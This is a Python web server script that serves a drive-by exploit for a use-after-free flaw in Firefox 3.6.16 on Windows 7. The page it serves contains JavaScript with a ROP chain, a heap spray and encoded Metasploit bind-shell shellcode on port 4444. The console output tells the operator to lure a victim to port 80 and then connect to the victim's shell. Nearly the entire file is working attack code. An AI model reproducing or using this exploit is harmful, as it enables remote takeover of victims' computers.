try:  # Py2
    from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
except ImportError:  # Py3
    from http.server import BaseHTTPRequestHandler, HTTPServer
class myRequestHandler(BaseHTTPRequestHandler):
    try:
        def do_GET(self):
            self.printCustomHTTPResponse(200)
            if self.path == "/":
                target = self.client_address[0]
                self.wfile.write("""
<html>
<body>
<applet code="rubik.class" width=140 height=140></applet>
<p><b>Mozilla mChannel Object use after free</b><br />
- Found by regenrecht<br />
- MSF exploit by Rh0<br />
- Win 7 fun version by mr_me</p>
<!--
Notes:
- This exploit requires <= java 6 update 25.
- optimized heap spray and still works on mutiple tabs as
  the spray is large enough to hit the 0x10000000 block.
- If you really want the class file you can get it here:
  http://javaboutique.internet.com/Rubik/rubik.class,
  but java still loads without it.
- Tested on windows 7 ultimate (latest updates).
- http://bit.ly/qD4Jkc
-->
<object id="d"><object>
<script type="text/javascript">
function trigger(){
        alert('ready?');
        fakeobject = document.getElementById("d"); // allocate the object
            fakeobject.QueryInterface(Components.interfaces.nsIChannelEventSink); // append to the objects available functions
        fakeobject.onChannelRedirect(null,new Object,0); // free it
        /*
        fill the object with a fake vtable reference
        just use the start of a block for simplicity and use \x00
        because it expands to a NULL so that
        when we have have the CALL DWORD PTR DS:[ECX+18], it will point to 0x10000000
        */
        fakevtable = unescape("\x00%u1000");
        var rop = "";
        // 3 instructions to pivot cleanly
        rop += unescape("%u1033%u6d7f"); // 0x6D7F1033 -> MOV EAX,[ECX] / PUSH EDI / CALL [EAX+4] <jvm.dll>
        rop += unescape("%u10a7%u6d7f"); // 0x6D7F10A7 -> POP EBP / RETN <jvm.dll>
        rop += unescape("%u1441%u6d7f"); // 0x6D7F1441 -> XCHG EAX,ESP / RETN <jvm.dll>
        // generic rop taken from MSVCR71.dll (thanks to corelanc0d3r)
        rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
        rop += unescape("%ua140%u7c37"); // 0x7c37a140 -> Make EAX readable
        rop += unescape("%u591f%u7c37"); // 0x7c37591f -> PUSH ESP / ... / POP ECX / POP EBP / RETN
        rop += unescape("%uf004%ubeef"); // 0x41414141 -> EBP (filler)
        rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
        rop += unescape("%ua140%u7c37"); // 0x7c37a140 -> *&VirtualProtect()
        rop += unescape("%u30ea%u7c35"); // 0x7c3530ea -> MOV EAX,[EAX] / RETN
        rop += unescape("%u6c0b%u7c34"); // 0x7c346c0b -> Slide, so next gadget would write to correct stack location
        rop += unescape("%u6069%u7c37"); // 0x7c376069 -> MOV [ECX+1C],EAX / POP EDI / POP ESI / POP EBX / RETN
        rop += unescape("%uf00d%ubeef"); // 0x41414141 -> EDI (filler)
        rop += unescape("%uf00d%ubeef"); // 0x41414141 -> will be patched at runtime (VP), then picked up into ESI
        rop += unescape("%uf00d%ubeef"); // 0x41414141 -> EBX (filler)
        rop += unescape("%u6402%u7c37"); // 0x7c376402 -> POP EBP / RETN
        rop += unescape("%u5c30%u7c34"); // 0x7c345c30 -> ptr to 'push esp / ret '
        rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
        rop += unescape("%udfff%uffff"); // 0xfffffdff -> size 0x00000201 -> ebx, modify if needed
        rop += unescape("%u1e05%u7c35"); // 0x7c351e05 -> NEG EAX / RETN
        rop += unescape("%u4901%u7c35"); // 0x7c354901 -> POP EBX / RETN
        rop += unescape("%uffff%uffff"); // 0xffffffff -> pop value into ebx
        rop += unescape("%u5255%u7c34"); // 0x7c345255 -> INC EBX / FPATAN / RETN
        rop += unescape("%u2174%u7c35"); // 0x7c352174 -> ADD EBX,EAX / XOR EAX,EAX / INC EAX / RETN
        rop += unescape("%ud201%u7c34"); // 0x7c34d201 -> POP ECX / RETN
        rop += unescape("%ub001%u7c38"); // 0x7c38b001 -> RW pointer (lpOldProtect) (-> ecx)
        rop += unescape("%ub8d7%u7c34"); // 0x7c34b8d7 -> POP EDI / RETN
        rop += unescape("%ub8d8%u7c34"); // 0x7c34b8d8 -> ROP NOP (-> edi)
        rop += unescape("%u4f87%u7c34"); // 0x7c344f87 -> POP EDX / RETN
        rop += unescape("%uffc0%uffff"); // 0xffffffc0 -> value to negate, target value : 0x00000040, target: edx
        rop += unescape("%u1eb1%u7c35"); // 0x7c351eb1 -> NEG EDX / RETN
        rop += unescape("%u6c0a%u7c34"); // 0x7c346c0a -> POP EAX / RETN
        rop += unescape("%u9090%u9090"); // 0x90909090 -> NOPS (-> eax)
        rop += unescape("%u8c81%u7c37"); // 0x7c378c81 -> PUSHAD / ADD AL,0EF / RETN
        sc = rop;
        // metasploit bind shell port 4444
        sc += unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u89d5%u31c7%u53db%u0268%u1100%u895c%u6ae6%u5610%u6857%udbc2%u6737%ud5ff%u5753%ub768%u38e9%uffff%u53d5%u5753%u7468%u3bec%uffe1%u57d5%uc789%u7568%u4d6e%uff61%u68d5%u6d63%u0064%ue389%u5757%u3157%u6af6%u5912%ue256%u66fd%u44c7%u3c24%u0101%u448d%u1024%u00c6%u5444%u5650%u5656%u5646%u564e%u5356%u6856%ucc79%u863f%ud5ff%ue089%u564e%uff46%u6830%u8708%u601d%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u41d5");
        // create a string with a ptr to the offset of our rop
        // used 0x1000001c to accomidate 0x18 + 0x4 (1st rop gadget)
        var filler = unescape("%u001c%u1000");
        while(filler.length < 0x100) {filler += filler;}
        /*
        create a string with 0x18 bytes at the start containing ptr's to the rop.
        This is to account for the vtable offset (0x18) -> 'CALL DWORD PTR DS:[ECX+18]'
        Then fill with sc + junk
        */
        var chunk = filler.substring(0,0x18/2);
        chunk += sc;
        chunk += filler;
        // create a string of size 64k in memory that contains sc + filler
        var heapblock = chunk.substring(0,0x10000/2);
        // keep adding more memory that contains sc + filler to reach 512kB
        while (heapblock.length<0x80000) {heapblock += heapblock;}
        /*
        using a final string of 512kB so that the spray is fast but ensuring accuracy
        - sub the block header length (0x24)
        - sub 1/4 of a page for sc (0x400)
        - sub the string length (0x04)
        - sub the null byte terminator
        */
        var finalspray = heapblock.substring(0,0x80000 - sc.length - 0x24/2 - 0x4/2 - 0x2/2);
        // optimised spray, precision can still be reliable even with tabs.
        // force allocation here of 128 blocks, using only 64MB of memory, speeeeeeed.
        arrayOfHeapBlocks = new Array()
        for (n=0;n<0x80;n++){
            arrayOfHeapBlocks[n] = finalspray + sc;
        }
}
trigger();
</script>
</body>
</html>
                """)
                self.wfile.write("""<title>Please wait...</title></head><body>""")
                self.wfile.write("""<left><body bgcolor="Black"><font color="White">
                Please wait<br>""")
                print(("\n\n[-] Exploit sent... [-]\n"
                       "[-] Wait about 30 seconds and attempt to connect.[-]\n"
                       "[-] Connect to IP Address: {0} and port 4444 [-]".format(target)))
        def printCustomHTTPResponse(self, respcode):
            self.send_response(respcode)
            self.send_header("Content-type", "text/html")
            self.send_header("Server", "myRequestHandler")
            self.end_headers()
    except:
        pass
httpd = HTTPServer(('', 80), myRequestHandler)
print("""
""")
print("    [-] Starting Mozilla Firefox 3.6.16 mChannel Object Use After Free Exploit (Win7) [-]")
print("    [-] Have someone connect to you on port 80 [-]")
print("\n\n    <ctrl>-c to Cancel")
try:
    httpd.handle_request()
    httpd.serve_forever()
except KeyboardInterrupt:
    print("\n\n    Exiting exploit...\n\n")